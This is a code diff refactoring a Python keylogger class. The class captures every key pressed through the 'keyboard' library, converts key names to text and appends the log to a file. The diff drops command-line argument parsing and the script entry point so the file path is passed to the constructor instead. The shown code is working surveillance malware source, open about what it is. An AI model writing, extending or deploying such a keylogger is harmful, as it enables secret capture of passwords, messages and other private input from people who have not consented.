@@ -1,24 +1,19 @@
-import argparse
-import keyboard
-import os
+import keyboard, os
 from threading import Semaphore, Timer
 
-#argument suport
-parser = argparse.ArgumentParser()
-parser.add_argument("-o","--output",required=True,help="Name of the output file")
-args = vars(parser.parse_args())
 
 class Keylogger():
-  def __init__(self):
+  def __init__(self,arg1):
     #reads inputs
     self.log = ""
-    #write out file 
-    self.out = open(args["output"],"a")
-    #thread
+    #write out object 
+    self.out = open(arg1,"a")
+    #block current thread
     self.Semaphore = Semaphore(0)
 
   def callback(self,event):
     name = event.name
+
     if len(name) > 1:
       if name == "space":
         name = " "
@@ -46,6 +41,3 @@ class Keylogger():
     self.report()
     self.Semaphore.acquire()
 
-if __name__ == '__main__':
-  keylogger = Keylogger()
-  keylogger.start()
